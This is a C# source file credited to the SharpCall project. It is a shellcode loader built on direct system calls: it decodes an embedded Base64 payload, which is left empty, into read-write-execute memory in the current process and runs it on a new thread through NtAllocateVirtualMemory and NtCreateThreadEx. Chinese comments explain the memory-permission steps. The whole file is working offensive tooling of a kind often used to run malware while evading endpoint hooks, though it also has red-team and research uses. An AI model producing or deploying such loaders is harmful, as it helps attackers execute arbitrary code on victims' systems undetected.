//
// Author: Jack Halon (@jack_halon)
// Project: SharpCall (https://github.com/jhalon/SharpCall)
// License: BSD 3-Clause
//

using System;
using System.Runtime.InteropServices;

using static Ar_syscall.Native;
using static Ar_syscall.Syscall;

namespace Ar_syscall
{
    class Program
    {
        static void Main()
        {


            byte[] payload = Convert.FromBase64String("");
            IntPtr hProcess = GetCurrentProcess();//进程句柄，当前进程为-1
            IntPtr pMemoryAllocation = new IntPtr(); 
            IntPtr pZeroBits = IntPtr.Zero;
            UIntPtr pAllocationSize = new UIntPtr(Convert.ToUInt32(payload.Length)); // 申请内存大小
            uint allocationType = (uint)Native.AllocationType.Commit | (uint)Native.AllocationType.Reserve; //分配内存
            uint protection = (uint)Native.AllocationProtect.PAGE_EXECUTE_READWRITE; // 设置内存权限为读写执行

            var ntAllocResult = NtAllocateVirtualMemory(hProcess, ref pMemoryAllocation, pZeroBits, ref pAllocationSize, allocationType, protection);  
            Marshal.Copy(payload, 0, (IntPtr)(pMemoryAllocation), payload.Length);

            IntPtr hThread = new IntPtr(0);
            ACCESS_MASK desiredAccess = ACCESS_MASK.SPECIFIC_RIGHTS_ALL | ACCESS_MASK.STANDARD_RIGHTS_ALL;
            IntPtr pObjectAttributes = new IntPtr(0);
            IntPtr lpParameter = new IntPtr(0);
            bool bCreateSuspended = false;
            uint stackZeroBits = 0;
            uint sizeOfStackCommit = 0xFFFF;
            uint sizeOfStackReserve = 0xFFFF;
            IntPtr pBytesBuffer = new IntPtr(0);


            var hThreadResult = NtCreateThreadEx(out hThread, desiredAccess, pObjectAttributes, hProcess, pMemoryAllocation, lpParameter, bCreateSuspended, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, pBytesBuffer);
            var result = NtWaitForSingleObject(hThread, true, 0); 



            return;
        }


        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();


    }
}
